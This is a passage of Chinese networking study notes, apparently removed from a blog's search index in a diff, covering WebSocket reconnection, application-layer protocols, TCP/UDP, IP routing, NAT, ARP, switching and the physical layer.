-指数退避算法：
-使用指数退避算法（Exponential Backoff）来避免频繁重连。每次重连失败后，重连间隔逐步增加，直到达到最大重连次数或时间。
-
-
-自动重连逻辑：
-客户端可以在 WebSocket 断开后设置自动重连。例如，在 onclose 事件中，尝试重新建立连接，直到成功。
-有时可以结合心跳机制，定期检查连接的状态，在连接失效时触发重连。
-
-
-服务器端处理：
-服务器端可以设置连接的 超时时间，如果客户端长时间未能响应心跳或者其他操作，服务器会主动关闭连接。
-服务器应能在客户端重连时恢复之前的会话状态，避免丢失数据。
-
-
-
-
-常见的其他应用层协议除了 HTTP、HTTPS 和 DNS，还有很多常用协议在实际开发和部署中不可或缺：
-FTP（文件传输协议）
-基于 TCP
-支持用户认证、文件上传下载
-有主动模式和被动模式之分，网络环境复杂时需谨慎配置防火墙
-
-SMTP、POP3、IMAP（电子邮件协议）
-SMTP 用于发送邮件，POP3 和 IMAP 用于接收邮件
-POP3 会将邮件拉取到本地，IMAP 则支持服务器同步
-现在常见邮件服务通常使用加密版本，如 SMTPS、IMAPS
-
-
-DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）工作在应用层。
-虽然它的主要作用是为主机自动分配 IP 地址、子网掩码、网关、DNS 等网络参数，这些信息属于网络层的范畴，但协议本身是由应用层定义和执行的。
-DHCP 的运作机制简述
-DHCP 通常在局域网中使用，典型流程如下：
-
-DHCP Discover：新加入网络的主机会广播发送 DHCP Discover 报文，寻找可用的 DHCP 服务器
-DHCP Offer：DHCP 服务器响应并提供一个可用的 IP 地址等配置信息
-DHCP Request：主机从接收到的多个 Offer 中选择一个，并发出 Request 报文表示接受
-DHCP Acknowledgement：服务器确认并正式分配该地址
-
-这个过程简称为 DORA（Discover, Offer, Request, Acknowledgement） 四步交互。
-DHCP 属于应用层的原因
-
-协议的实现是在应用层完成的，使用的是客户端-服务器模型
-运行在 UDP 协议之上（即传输层用的是 UDP）
-客户端使用端口 68
-服务器使用端口 67
-
-
-报文格式和交互逻辑定义在应用层协议规范中
-
-DHCP 与其他网络层协议的关系
-虽然 DHCP 协议属于应用层，但它的作用直接影响网络层的工作：
-
-为网络层配置所需的 IP 地址、子网掩码、默认网关
-帮助主机自动获取 DNS 地址，从而支持域名解析（也是应用层功能）
-
-因此可以理解为：DHCP 是一个在应用层工作的协议，用来自动配置网络层参数。
-
-传输层传输层的作用传输层位于应用层之下，主要负责在两个主机之间提供端到端的数据传输服务。相比网络层只关心数据从哪台主机传到哪台主机，传输层更进一步，确保具体的应用程序之间可以可靠或高效地通信。
-常见的传输层协议包括 TCP 和 UDP。两者在可靠性、传输速度、连接管理等方面差异明显，适用场景也不同。
-
-TCP 协议的核心特性TCP（Transmission Control Protocol）是面向连接的协议，强调可靠传输，具备完整的错误检测、丢包重传、数据排序与流量控制机制。
-面向连接TCP 通信前必须建立连接，这一过程通过“三次握手”完成。连接建立后，双方可以双向稳定通信，通信结束后通过“四次挥手”释放连接资源。
-有序传输TCP 使用序列号（Sequence Number）对每一个字节进行编号，接收方按顺序重组数据，确保数据按发送顺序到达。
-可靠传输机制TCP 提供多种机制保障传输可靠：
-
-确认应答：接收方每收到数据会发送 ACK 确认包
-重传机制：若一定时间内未收到 ACK，发送方会重发数据
-超时重传：根据 RTT 动态计算超时时间，避免网络阻塞
-拥塞控制与流量控制：根据网络状态和接收能力调整发送速度，防止网络拥塞或接收端被压垮
-
-全双工通信TCP 支持双方同时发送和接收数据，底层通过维护两个单独的数据流来实现。
-
-TCP 三次握手与四次挥手三次握手过程
-客户端发送 SYN（同步）包，进入 SYN_SENT 状态
-服务器回复 SYN+ACK 包，进入 SYN_RCVD 状态
-客户端回复 ACK，双方进入 ESTABLISHED 状态，连接建立完成
-
-这样可以确保双方都具备发送与接收的能力，并同步初始序列号。
-四次挥手过程
-客户端发送 FIN，表示无数据可发
-服务器回复 ACK，进入 CLOSE_WAIT 状态
-服务器处理完剩余数据后，发送 FIN
-客户端回复 ACK，等待一段时间后关闭连接
-
-这种拆分可以让服务器在释放连接前处理完未发送完的数据。
-
-TCP 的流量控制与拥塞控制流量控制TCP 使用滑动窗口机制进行流量控制，窗口大小由接收方通知发送方，表示“还能接收多少数据”。发送方根据这个值控制发送速率，避免接收方缓存被压满。
-拥塞控制TCP 通过以下策略应对网络拥塞：
-
-**慢启动（Slow Start）：**每次翻倍，直到阈值后进入拥塞避免
-**拥塞避免（Congestion Avoidance）：**线性增加
-**快速重传（Fast Retransmit）：**发送方收到三个连续的对最后包的ACK，说明后续包丢失，触发快速重传
-**快速恢复（Fast Recovery）：**触发快速重传后，拥塞窗口（CWND） 会被 减少到慢启动阈值（ssthresh）的一半，并且 ssthresh 被设置为当前 CWND 的一半，然后线性增长，大概是这样，这里具体是啥忘了。。
-
-这些策略通过调整拥塞窗口大小，在检测到丢包时迅速反应，从而动态调节传输速率。
-
-UDP 协议的特点UDP（User Datagram Protocol）是无连接的协议，强调快速、轻量、无需握手。
-无连接模型UDP 不建立连接，也不维持连接状态，发送数据不需要对方回应。适用于对时延要求高、偶尔丢包可以接受的场景，如视频通话、语音传输、DNS 请求等。
-不保证顺序和可靠性UDP 数据包称为“数据报”，独立发送，不保证顺序，也不重传丢失的包。上层应用如果需要可靠性，需要自己实现逻辑。
-高效传输由于没有握手、确认等机制，UDP 的延迟更低，适合实时性强的通信场景。
-
-传输层端口的作用传输层使用端口号来区分主机上的不同进程。每个网络连接都有四元组标识：
-
-源 IP
-源端口
-目标 IP
-目标端口
-
-端口范围为 0-65535，其中 0-1023 为知名端口，常见如：
-
-HTTP：80
-HTTPS：443
-DNS：53
-FTP：21
-SSH：22
-
-端口号帮助操作系统将收到的数据准确交付到目标应用程序。
-
-TCP 粘包与拆包问题粘包和拆包 是在 TCP 协议中常见的问题，通常发生在数据发送和接收的过程中。由于 TCP 是面向流的协议（stream-oriented），它并不像 UDP 那样把每个数据包都当作独立的单位进行处理，而是将数据流通过一个持续的连接进行传输。这种特性导致了 粘包 和 拆包 问题的出现。
-什么是粘包和拆包
-粘包（Packet Concatenation）：在发送多个数据包时，由于 TCP 协议是一个 面向流的协议，多个数据包可能被合并成一个大的数据块发送，接收方接收到的数据就可能包含了多个发送的数据包。这种现象叫做“粘包”。也就是说，接收方读取的一个数据包可能包含了多个逻辑数据包，接收方需要能够正确区分这些数据包。
-拆包（Packet Fragmentation）：拆包与粘包相反，发生在发送的数据包被拆分成多个部分。由于网络传输的最大传输单元（MTU）限制，数据包可能会被分割为多个部分进行发送，接收方需要正确地将这些部分重新组合成一个完整的消息。也就是说，发送方发送的数据包可能会被拆成多个小块，接收方需要知道如何将这些碎片拼接回原始数据包。
-
-为什么会发生粘包和拆包问题TCP 是一个 面向字节流 的协议，它不会保留消息边界的概念。这意味着：
-
-在传输过程中，发送方并不会告诉接收方每次发送的数据包的边界（即数据包的开始和结束）。
-接收方收到的 TCP 数据流可能是由多个包拼接成的一个大数据块，或者一个大包被拆分成多个小数据块。
-
-这些特点导致了 粘包 和 拆包 问题的出现。
-粘包的原因：
-发送方连续快速发送数据：发送方将多个数据包快速发送，接收方无法分辨各个数据包的边界。
-TCP的流式传输：TCP 将数据作为字节流发送，没有对消息边界的明确区分，接收方必须根据协议自行处理数据的划分。
-
-拆包的原因：
-数据包大小超出网络的最大传输单元（MTU）：TCP 会根据网络的最大传输单元来分割数据，如果发送的数据包大小超过了 MTU，数据会被拆分成多个部分发送。
-数据过大或系统缓冲区限制：系统在传输过程中可能会因为缓冲区大小的限制将数据拆分为多个部分。
-
-TCP 如何处理粘包和拆包问题TCP 协议本身并不提供 消息边界 的机制，因此开发者需要在 应用层 处理粘包和拆包问题。常见的解决方法包括：
-固定长度的数据包
-概念：如果每个发送的数据包的大小是固定的，接收方就可以通过固定长度来划分数据流。例如，每次发送的数据包都是 1024 字节，那么接收方每次就可以按照 1024 字节来读取数据。
-优点：简单且容易实现，接收方只需每次读取固定长度的数据即可。
-缺点：如果数据包大小不固定，或者数据变化较大，这种方式就不能很好地处理。
-
-分隔符（协议中的特殊标识符）
-概念：通过在每个数据包的末尾加上一个特殊的分隔符（例如换行符 \n 或自定义的结束标志），接收方通过检测这些分隔符来判断数据包的边界。
-优点：简单易用，适用于小数据量的传输。
-缺点：如果数据内容本身可能包含这些分隔符，必须保证发送的数据内容不干扰分隔符的作用，或者使用更复杂的编码方式来保证分隔符的唯一性。
-
-长度字段（长度前缀）
-概念：每个数据包的开头附加一个固定长度的字段，表示该数据包的长度。接收方首先读取长度字段，然后根据长度字段来读取实际的数据内容。
-工作流程：
-发送方在每个数据包的头部加上一个 长度字段（例如 4 字节，用来表示数据包的大小）。
-接收方首先读取这个长度字段，然后根据长度字段读取相应数量的字节。
-
-
-优点：这种方式能够很好地处理变长的数据包，适用于各种情况。
-缺点：每个数据包需要额外的存储空间来保存长度字段，这增加了额外的开销。
-
-基于时间的读取
-概念：接收方根据一个固定的超时时间来确定数据包的边界。它不断地从 TCP 流中读取数据，当读取到一定数量的数据后，或者等待超时后，就将这些数据作为一个完整的消息处理。
-优点：简单且适用于数据传输速度较慢或传输间隔较长的场景。
-缺点：依赖于延时和时间的控制，可能不适用于高性能要求的场景。
-
-实际应用中的常见方法
-HTTP 协议：HTTP 使用 请求头 中的 Content-Length 或 Transfer-Encoding（如分块传输编码）来标识每个数据包的大小，从而避免了粘包和拆包问题。
-WebSocket：WebSocket 协议提供了基于消息的传输，可以避免粘包和拆包问题，因为它保证每个消息都是独立的，不会混合或拆分。
-自定义协议：在很多应用中，开发者会使用 长度字段 或 分隔符 来设计自定义协议，以解决粘包和拆包问题。例如，使用 \n 来分隔每一行数据，或者在每个数据包前加上长度字段，告诉接收方数据的大小。
-
-
-网络层网络层的作用网络层位于传输层之下，主要负责将数据从一台主机跨越多个网络传输到另一台主机。其核心任务包括：
-
-寻址：为每台主机分配唯一的地址（IP 地址）
-路由：选择一条合适的路径将数据包从源头传到目的地
-分片与重组：在链路层无法承载大数据包时进行分段传输
-
-可以将网络层类比为快递公司的“全国调度系统”，负责确定哪条路线可以最快、最稳地将快递送到目的地城市。
-
-IP 协议与地址结构IP 协议（Internet Protocol）是网络层的核心协议。每台连接到网络的设备都需要一个唯一的 IP 地址，用来标识其网络位置。
-IPv4 地址结构IPv4 使用 32 位地址，通常以点分十进制表示，例如：192.168.1.1
-IP 地址由两部分组成：
-
-网络号：标识所属的网络
-主机号：标识该网络中的主机
-
-为了支持更多网络，IP 地址又与“子网掩码”配合使用，进行网络划分。
-例如：IP 地址：192.168.1.10子网掩码：255.255.255.0则网络号为 192.168.1.0，主机号为 10
-
-子网划分与 CIDR 表示法为了更灵活地管理 IP 资源，引入了无类别域间路由（CIDR）表示法。例如：
-192.168.1.0/24
-
-其中 /24 表示前 24 位是网络号，后 8 位用于主机编号。可以容纳的主机数为：
-2^(32 - 子网掩码长度) - 2
-
-常见的子网划分技巧包括：
-
-减少广播范围，提升局域网效率
-合理分配地址空间，减少浪费
-提供更好的网络隔离和安全性
-
-
-IP 数据报结构与分片机制IP 协议是无连接、不可靠的，主要负责将数据打包为 IP 数据报并发送。
-数据报结构包括：
-
-首部：版本号、源 IP、目标 IP、TTL、协议类型等
-数据部分：封装的传输层数据（如 TCP 报文）
-
-当数据报超过底层链路的最大传输单元（MTU）时，需要进行分片：
-
-每片包含 IP 首部 + 数据片段
-设置分片偏移标志，指明每片在原始数据中的位置
-目标主机在收到所有片段后再重新组装
-
-注意：IP 分片通常由发送端或路由器完成，但过度分片可能影响性能，很多现代协议（如 TCP）会避免发送超出 MTU 的数据包。
-
-ICMP 协议与网络诊断ICMP（Internet Control Message Protocol）是网络层的重要辅助协议，主要用于网络诊断和错误反馈。
-常见用途：
-
-ping 命令：通过发送 ICMP Echo 请求检测目标主机是否可达
-traceroute 工具：用于查看数据经过的所有路由节点，通过控制 TTL 值和接收 ICMP 超时报文实现
-
-ICMP 类型众多，例如：
-
-类型 0：Echo Reply
-类型 3：目标不可达
-类型 11：TTL 超时
-
-虽然 ICMP 不用于传输实际业务数据，但在排查网络故障、判断网络连通性时极为重要。
-
-路由选择与路由协议网络层需要选择一条合适的路径将数据包从源头传送到目标地址，这就依赖于路由表和路由协议。
-静态路由与动态路由
-静态路由：由管理员手动配置，适用于结构简单、变化少的网络
-动态路由：由路由协议自动计算和维护，适用于大型复杂网络
-
-常见的路由协议
-RIP（Routing Information Protocol）：基于跳数，收敛慢，适合小网络，属于网关协议 (IGP - Interior Gateway Protocol)
-OSPF（Open Shortest Path First）：基于链路状态，收敛快、可扩展性强，属于内部网关协议
-BGP（Border Gateway Protocol）：用于自治系统间的路由，是互联网骨干的重要协议，属于外部网关协议 (EGP - Exterior Gateway Protocol)
-
-每种协议都有自己的适用范围和策略权重，实际使用时通常会根据网络规模和稳定性要求综合选择。
-
-网络地址转换（NAT）由于 IPv4 地址资源有限，大多数家庭或公司网络使用 NAT 技术让多个内网设备共享一个公网 IP。
-常见的 NAT 类型：
-
-静态 NAT：一对一映射，适合需要被外网访问的服务
-动态 NAT：从公网 IP 池中动态分配
-PAT（端口地址转换）：最常见形式，也称为 NAPT，让多个内网设备共用同一个公网 IP，通过端口区分不同连接
-
-NAT 极大地缓解了地址资源紧张问题，但也带来了一些限制，例如 P2P 通信受阻、端到端加密挑战等。
-
-数据链路层数据链路层的作用数据链路层位于网络层之下，主要职责是在同一链路内的两个节点之间可靠地传输数据帧。它不关心数据从哪台主机来，也不关心去往哪里，它只处理“从这一跳送到下一跳”。
-网络通信过程中，每经过一个路由器，数据链路层的链路就会断开并重新建立。因此，数据链路层的通信是逐段进行的，而非端到端。
-
-MAC 地址与链路标识数据链路层使用 MAC 地址（Media Access Control Address）作为主机的唯一标识。每个网卡在出厂时都会被烧录一个唯一的 48 位地址，一般用十六进制表示，例如：
-00:1A:2B:3C:4D:5E
-
-MAC 地址工作在局域网范围，不能跨越路由器。而 IP 地址是逻辑地址，可以通过网络层路由转发。
-MAC 地址在以太网通信中扮演“收件人”和“寄件人”的角色。网络设备通过 MAC 地址找到数据帧的目标主机。
-
-以太网帧的结构以太网是最常见的链路层协议，它定义了数据帧的格式和传输方式。标准以太网帧结构如下：
-+----------------+----------------+-------------+---------------+-------------+|  目的 MAC 地址  |  源 MAC 地址   |  类型字段    |  数据（Payload） |  CRC 校验值   |+----------------+----------------+-------------+---------------+-------------+
-
-
-目的 MAC 地址：目标设备的地址
-源 MAC 地址：发送设备的地址
-类型字段：指出上层协议（如 0x0800 表示 IP 协议）
-数据部分：封装上层传输层或网络层的数据
-CRC 校验：用于检测数据在传输中是否被篡改
-
-每个数据帧最大传输单元（MTU）通常为 1500 字节，超出部分需要网络层进行分片。
-
-ARP 协议实现地址解析ARP（Address Resolution Protocol）是数据链路层与网络层之间的桥梁，用于将 IP 地址解析为 MAC 地址。
-典型的 ARP 流程
-主机 A 想发送数据给主机 B，只知道 B 的 IP 地址
-A 在局域网广播 ARP 请求，询问“谁是这个 IP？”
-B 收到后，发送 ARP 回复，告知自己的 MAC 地址
-A 将 B 的 MAC 地址缓存在 ARP 表中，用于后续通信
-
-这种机制是动态的，ARP 缓存会在一段时间后过期并重新解析。
-
-广播、单播与多播的区别链路层通信模式有三种：
-
-单播（Unicast）：点对点通信，只发给目标 MAC 地址
-广播（Broadcast）：发给局域网内所有设备，MAC 地址为 FF:FF:FF:FF:FF:FF
-多播（Multicast）：发给特定一组设备，MAC 地址以 01:00:5E 开头
-
-ARP 请求就是典型的广播形式，DHCP 请求、网络发现等服务也常用广播或多播机制。
-
-交换机的基本工作原理交换机是工作在数据链路层的核心设备。它通过维护一个MAC 地址表，实现高效的帧转发。
-工作流程如下：
-
-交换机收到一个数据帧，记录其源 MAC 与入口端口
-查找目的 MAC 是否已在表中
-有：直接将数据帧发到对应端口
-没有：广播给所有端口（除接收端），等待目的主机响应
-
-
-
-交换机比集线器更智能，能够避免不必要的广播，提高网络性能。
-
-集线器的基本工作原理集线器的工作原理可以理解为一个非常简单的“广播”设备。当一个设备发送数据到集线器时，集线器会将数据传递给所有其他连接到它的设备，而不是根据目标地址将数据发送给特定的设备。这意味着集线器没有智能化地判断哪些设备应该接收数据，它只是将接收到的数据广播到所有端口。
-
-VLAN 与链路层隔离机制VLAN（Virtual LAN）是一种逻辑上的网络隔离方式，可以将不同物理位置的主机划分到同一个逻辑广播域中。
-通过给以太网帧增加 VLAN Tag，可以将网络划分为多个逻辑子网，达到以下目的：
-
-控制广播范围
-提升网络安全
-简化网络管理
-
-VLAN 是一种链路层技术，但其配置依赖交换机对 802.1Q 协议的支持。
-
-数据链路层中的错误检测数据链路层不保证数据可靠，但会尽力发现错误并丢弃异常帧。其中最常见的机制是：
-
-CRC 校验：帧末尾附加校验值，用于检测传输过程中的比特错误
-帧长检查：非法帧长通常直接丢弃
-MAC 地址过滤：不符合地址匹配的帧会被忽略
-
-但需要注意的是，链路层不会自动重传数据，重传逻辑通常由传输层（如 TCP）来完成。
-
-广播风暴一些协议或服务（例如 ARP 请求、DHCP 发现请求）会产生广播数据包。如果网络中没有有效的流量控制或广播限制，可能导致广播包递归传播，形成广播风暴。
-生成树协议（STP） 是一种网络协议，用于防止交换机网络中的环路。STP 通过关闭某些冗余路径，确保在网络中没有环路，从而避免广播风暴的发生。
-
-物理层物理层的作用物理层处于网络模型的最底层，负责将比特流（0 和 1）通过各种物理媒介在设备之间传输。它不关心数据的格式、结构和含义，只关注如何把 0 和 1 表示成物理信号，并尽可能地准确传送到接收端。
-简单来说，物理层就是在解决“如何把数据发出去”，包括电缆、网卡、光纤、无线信号等。
-
-比特传输与编码方式数据在物理层以比特（bit）为单位传输。传输方式有很多种，不同场景使用的编码方式可能不同：
-
-非归零编码（NRZ）：高电平表示 1，低电平表示 0
-曼彻斯特编码：用电平跳变表示比特，抗干扰能力更强
-基带传输与宽带传输：直接调制与间接调制的区别
-
-传输的信号可以是：
-
-电信号（双绞线、同轴电缆）
-光信号（光纤）
-无线电波（Wi-Fi、蓝牙）
-
-这些信号的生成、放大、转换与传输都归属物理层。
-
-传输介质的类型物理层涉及的传输介质通常有以下几种：
-双绞线（Twisted Pair）最常用的网线类型，如 CAT5e、CAT6。其内部由成对缠绕的铜线构成，用于抵消电磁干扰。支持百兆、千兆、万兆等传输速率。
-光纤（Fiber Optic）以光信号方式传输数据，传输速率极高、距离远、抗干扰能力强。分为单模光纤和多模光纤，广泛用于数据中心与骨干网。
-同轴电缆（Coaxial Cable）早期局域网中常用的介质，现在主要用于有线电视网络。结构上有良好的屏蔽层，但已不常用于现代以太网。
-无线传输包括 Wi-Fi、蓝牙、蜂窝通信等，使用射频方式进行比特传输。属于物理层的无线信号载波，与链路层的无线协议配合使用。
-
-常见接口标准物理层的另一个重要部分是定义硬件接口标准，这些标准规定了：
-
-电压水平
-接口形状
-速率规范
-引脚定义
-
-常见接口包括：
-
-RJ45：以太网常用接口
-光纤接头（如 SC、LC）：用于光纤通信
-USB、HDMI、Serial Port：部分接口标准也涵盖物理层定义
-802.11 系列标准：Wi-Fi 的物理层和链路层协议合集
-
-
-信号传输中的干扰与失真物理层传输的信号可能受到多种干扰：
-
-串扰：相邻线路之间的电磁干扰
-噪声：来自电源、无线电、机械等外部环境的干扰
-衰减：信号随着距离的增加而变弱
-反射与回波：不良接头或阻抗不匹配导致信号反弹
-
-为了减少这些问题，通常需要配合屏蔽电缆、信号放大器、调制器等硬件设施。
-
-传输速率与带宽概念物理层中常涉及两个容易混淆的术语：
-
-带宽（Bandwidth）：表示信道理论上能承载的频率范围，单位为 Hz
-速率（Data Rate）：表示单位时间传输的比特数量，单位为 bps（bit per second）
-
-带宽越高，理论上的数据传输能力越强。但最终的传输速率还受到调制方式、信噪比、协议效率等多种因素影响。
-例如：
-
-100BASE-T：百兆以太网，最大 100 Mbps
-1000BASE-T：千兆以太网，最大 1000 Mbps
-10GBASE-SR：万兆光纤网络
-
-
-调制解调的基本概念在一些物理层实现中（尤其是模拟线路），比特信号不能直接传输，需要通过调制技术将数字信号转换为模拟信号，接收端再进行解调。
-典型例子是电话线使用的 ADSL、早期拨号上网使用的调制解调器（Modem）：
-
-调制（Modulation）：将数字信号嵌入到载波中传输
-解调（Demodulation）：从接收到的信号中还原出原始比特流
-
-虽然在现代局域网中调制已不常见，但在广域网、无线通信中仍然广泛使用。
-
-总结可以将五层模型简单地图示如下：
-应用层       ← 提供网络应用服务（如网页、邮件）传输层       ← 端到端通信，确保可靠或快速传输网络层       ← 跨网络寻址与路由，主机之间建立路径数据链路层   ← 相邻设备之间的数据帧传输（同一个链路）物理层       ← 0 和 1 的物理信号化与真实传输
-
-数据在发送时是自上而下封装的，从应用层逐层打包，到物理层转成信号发出；接收时则反过来，从物理层接收信号，逐层还原数据直到应用层。
-]]></content>
-      <tags>
-        <tag>网络</tag>
       </tags>
   </entry>
 </search>
